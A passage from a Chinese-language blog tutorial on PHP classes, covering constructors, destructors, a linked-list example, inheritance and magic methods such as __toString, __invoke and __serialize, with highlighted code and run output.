class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//缺省参数</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; rise\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; fall\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;deutschball.github.io&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the republic rise</span><br><span class="line">the republic fall</span><br></pre></td></tr></table></figure>
<h3 id="引用">引用</h3>
<p>php中,函数传参时,对象类型默认为引用传递</p>
<p>比如实现一个链表类:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedNode</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$next</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$v</span>=<span class="number">0</span>,<span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="variable">$v</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setValue</span>(<span class="params"><span class="variable">$v</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value=<span class="variable">$v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setNext</span>(<span class="params"><span class="variable">$n</span>=<span class="literal">NULL</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;next=<span class="variable">$n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="number">0</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isEmpty</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>()==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insertHead</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$node</span>=<span class="keyword">new</span> <span class="title class_">LinkedNode</span>(<span class="variable">$v</span>,<span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">setNext</span>(<span class="variable">$node</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHead</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>())<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>()-&gt;<span class="title function_ invoke__">getValue</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">deleteHead</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isEmpty</span>())<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">setNext</span>(<span class="variable">$this</span>-&gt;head-&gt;<span class="title function_ invoke__">getNext</span>()-&gt;<span class="title function_ invoke__">getNext</span>());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="variable language_">$this</span>-&gt;head;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$p</span>-&gt;<span class="title function_ invoke__">getNext</span>()!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$p</span>-&gt;<span class="title function_ invoke__">getNext</span>();</span><br><span class="line">            <span class="keyword">print</span> <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">getValue</span>().<span class="string">&quot;  &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$linkedlist</span>=<span class="keyword">new</span> <span class="title class_">LinkedList</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">10</span>;++<span class="variable">$i</span>)&#123;</span><br><span class="line">    <span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">insertHead</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$linkedlist</span>();</span><br><span class="line"><span class="keyword">while</span>(!<span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">isEmpty</span>())&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$linkedlist</span>-&gt;<span class="title function_ invoke__">deleteHead</span>();</span><br><span class="line">    <span class="variable">$linkedlist</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="继承">继承</h3>
<p>继承关键字extends,php不支持多继承</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 代码部分</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>子类构造函数不会主动调用父类的构造函数,可以使用<code>parent::__construct()</code>显式调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/* 成员变量 */</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 成员函数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setDomain</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDomain</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;domain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;title;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; rise\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;title . <span class="string">&quot; fall\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;deutschball.github.io&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child_Site</span> <span class="keyword">extends</span> <span class="title">Site</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$icon_domain</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span>,<span class="variable">$par3</span> =<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>(<span class="variable">$par1</span>,<span class="variable">$par2</span>);<span class="comment">//parent::指向父类成员</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;icon_domain=<span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">__destruct</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setIconDomain</span>(<span class="params"><span class="variable">$idomain</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;icon_domain=idomain;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIconDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;icon_domain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ChildInstance</span>=<span class="keyword">new</span> <span class="title class_">Child_Site</span>(<span class="string">&quot;dustball.top&quot;</span>,<span class="string">&quot;the empire&quot;</span>,<span class="string">&quot;https://raw.githubusercontent.com/DeutschBall/test/master/emp.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="魔术方法">魔术方法</h3>
<p>PHP预留的以双下划线开头的类成员函数,它们是</p>
<blockquote>
<p><strong><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.decon.php#object.construct">__construct()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct">__destruct()</a></strong>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.call">__call()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.callstatic">__callStatic()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.get">__get()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.set">__set()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.isset">__isset()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.overloading.php#object.unset">__unset()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">__sleep()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup">__wakeup()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.set-state">__set_state()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.cloning.php#object.clone">__clone()</a>
、 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.debuginfo">__debugInfo()</a></p>
</blockquote>
<h4
id="construct__destruct"><code>__construct&amp;&amp;__destruct</code></h4>
<p>只有在使用new关键字创建新对象的时候,<code>__construct</code>构造函数才会被自动调用</p>
<p><code>clone</code>拷贝或者<code>unserialize</code>反序列化都不会调用<code>__construc</code></p>
<p><code>__destruct</code>由系统自动调用,发生在对象生命期结束时</p>
<h4 id="tostring"><code>__toString()</code></h4>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a>
方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code>
应该显示些什么。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[&quot;</span>.<span class="variable language_">$this</span>-&gt;title.<span class="string">&quot;=&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;domain.<span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;deutschball.github.io&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$mySite</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[the republic=&gt;deutschball.github.io]</span><br></pre></td></tr></table></figure>
<h4 id="invoke"><code>__invoke()</code></h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__invoke</span>( ...<span class="variable">$values</span>): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>当尝试以调用函数的方式调用一个对象时，<a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.invoke">__invoke()</a>
方法会被自动调用。</p>
</blockquote>
<blockquote>
<p>相当于C++中的仿函数运算符<code>operator ()</code></p>
</blockquote>
<p>比如对于Site类的对象,直接当成函数调用的时候,访问域名</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par1</span> = <span class="number">0</span>, <span class="variable">$par2</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$par2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://<span class="subst">$this</span>-&gt;domain&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;dustball.top&quot;</span>, <span class="string">&quot;the republic&quot;</span>);</span><br><span class="line"><span class="variable">$mySite</span>();</span><br></pre></td></tr></table></figure>
<p>用浏览器访问本php文件,之后会跳转<code>dustball.top</code></p>
<h4
id="serialize__unserialize"><code>__serialize()&amp;&amp;__unserialize()</code></h4>
<p>自定义序列化键值对数组(没有卵用)的函数</p>
<blockquote>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>
函数会检查类中是否存在一个魔术方法 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
。</p>
<p>如果存在，该方法将在任何序列化之前<strong>优先执行</strong>。</p>
<p>它必须以一个代表对象序列化形式的 键/值 成对的关联数组形式来返回，</p>
<p>如果没有返回数组，将会抛出一个 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.typeerror.php">TypeError</a>
错误。</p>
<p><a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
的预期用途是定义对象序列化友好的任意表示。
数组的元素可能对应对象的属性，但是这并不是必须的。</p>
<p>相反， <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>
检查是否存在具有名为 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.unserialize">__unserialize()</a>
的魔术方法。</p>
<p>此函数将会传递从 <a
target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php#object.serialize">__serialize()</a>
返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$domain</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span> = <span class="number">0</span>, <span class="variable">$t</span> = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$d</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>):<span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__serialize acitved \n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;d&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;domain,<span class="comment">//此处的键为&#x27;d&#x27;,则__unserialize中的键也应该是&#x27;d&#x27;,即$data[&#x27;d&#x27;]</span></span><br><span class="line">            <span class="string">&#x27;t&#x27;</span> =&gt; <span class="variable language_">$this</span>-&gt;title,</span><br><span class="line">        ];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;__unserialize actived \n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;domain = <span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;title = <span class="variable">$data</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//方便打印观察,重载<span class="title">invoke</span>函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[&quot;</span>.<span class="variable language_">$this</span>-&gt;title.<span class="string">&quot;,&quot;</span>.<span class="variable language_">$this</span>-&gt;domain.<span class="string">&quot;]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mySite</span> = <span class="keyword">new</span> <span class="title class_">Site</span>(<span class="string">&quot;dustball.top&quot;</span>, <span class="string">&quot;the 